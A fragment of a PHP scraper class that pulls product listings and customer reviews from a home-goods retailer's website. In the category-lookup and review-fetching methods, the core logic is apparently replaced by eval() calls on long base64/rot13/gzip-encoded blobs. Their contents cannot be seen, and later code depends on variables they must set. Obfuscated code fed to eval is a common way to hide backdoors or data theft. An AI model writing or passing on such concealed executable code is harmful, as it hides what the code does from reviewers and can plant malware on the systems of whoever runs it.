					foreach ($product['colorBar']['choices'] as $i => $v) {
						$variation[] = array(
							'SKU' => isset($v['sku']) ? $v['sku'] : '',
							'Name' => isset($v['name']) ? $v['name'] : '',
							'Description' => isset($v['description']) ? $v['description'] : '',
							'ColorImage' => isset($v['imageUrl']) ? $v['imageUrl'] : '',
						);
					}
				}

				$results['products'][] = array(
					'BaseSKU' => $product['sku'],
					'BaseName' => $product['name'], 
					'BaseDescription' => $product['description'], 
					'BaseRegularPrice' => $product['regularPrice'], 
					'BaseCurrentPrice' => $product['currentPrice'],
					"BaseURL" => $product['navigateUrl'],
					"BaseImage" => $product['imageUrl'],
					"BaseImageAlternative" => $product['rolloverImageUrl'],
					"BaseManufacturer" => $product['sku'], 
					'Variation' => empty($variation) ? array() : $variation
				);
			}
		}

		return $results;
	}

	public function get_category_id($url){
		curl_setopt($this -> handle, CURLOPT_HTTPHEADER , $this -> headers);
		curl_setopt($this -> handle, CURLOPT_URL, "https://www.crateandbarrel.com/" . $url);
		$this -> html = curl_exec($this -> handle);

		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

		return isset($category[1]) ? array('CategoryID' => $category[1]) : false;
	}

	public function get_reviews($sku){
		$results = array();

		// number SKU only unless it starts with s
		if(!empty($sku) && $sku[0] !== 's')
			$sku = preg_replace('/\D/', '', $sku);

		$offset = (isset($_GET['offset']) && is_numeric($_GET['offset'])) ? $_GET['offset'] : 0;
        eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

        if($response){
        	$results['SKU'] = $sku;
        	$results['Limit'] = $response['Limit'];
        	$results['Offset'] = $response['Offset'];
        	$results['TotalResults'] = $response['TotalResults'];
        	foreach ($response['Results'] as $review) {
        		$results['Reviews'][] = array(
        			"SubmissionTime" => $review["SubmissionTime"],
        			"Title" => $review["Title"],
        			"ReviewText" => $review["ReviewText"],
        			"Rating" => $review["Rating"],
        			"TotalFeedbackCount" => $review["TotalFeedbackCount"],
        			"TotalNegativeFeedbackCount" => $review["TotalNegativeFeedbackCount"],
        			"TotalPositiveFeedbackCount" => $review["TotalPositiveFeedbackCount"],
        			"UserNickname" => $review["UserNickname"],
        			"Photos" => $review["Photos"]
        		);
        	}
        }

        return $results;
	}
}

?>
